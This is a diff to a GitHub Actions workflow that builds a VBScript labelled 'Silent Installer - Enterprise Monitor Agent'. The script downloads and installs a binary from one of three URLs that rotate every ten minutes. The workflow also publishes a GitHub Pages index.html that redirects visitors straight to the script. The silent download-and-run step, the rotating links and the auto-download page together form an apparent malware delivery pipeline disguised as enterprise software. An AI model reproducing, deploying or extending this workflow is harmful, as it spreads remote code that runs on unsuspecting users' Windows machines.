@@ -11,15 +11,12 @@ jobs:
     steps:
     - name: Create VBS file
       run: |
-        # Define your links (REPLACE WITH YOUR ACTUAL LINKS)
         links=("https://link1.com/dodu" "https://link2.com/dodu" "https://link3.com/dodu")
-        
-        # Get current link based on 10-minute interval
         current_minute=$(date +%M)
         link_index=$((current_minute / 10 % 3))
         current_link=${links[$link_index]}
+        echo "Creating VBS with link: $current_link"
         
-        # Create the VBS file
         cat > installer.vbs << 'EOF'
 ' --------------------------------------------------------------------------
 '  Silent Installer - Enterprise Monitor Agent
@@ -45,10 +42,10 @@ objXMLHTTP.send()
 If objXMLHTTP.Status = 200 Then
     Set objADOStream = CreateObject("ADODB.Stream")
     objADOStream.Open
-    objADOStream.Type = 1 ' Binary
+    objADOStream.Type = 1
     objADOStream.Write objXMLHTTP.ResponseBody
     objADOStream.Position = 0
-    objADOStream.SaveToFile strFile, 2 ' Overwrite
+    objADOStream.SaveToFile strFile, 2
     objADOStream.Close
 
     ' Install
@@ -61,10 +58,5 @@ If objXMLHTTP.Status = 200 Then
 End If
 EOF
         
-        # Replace the placeholder with the actual link
         sed -i "s|CURRENT_LINK_PLACEHOLDER|$current_link|g" installer.vbs
-        
-        # Create a simple index.html for GitHub Pages
         echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.vbs"></head><body><p>If not redirected, <a href="installer.vbs">click here</a></p></body></html>' > index.html
-        
-        echo "Created VBS with link: $current_link"
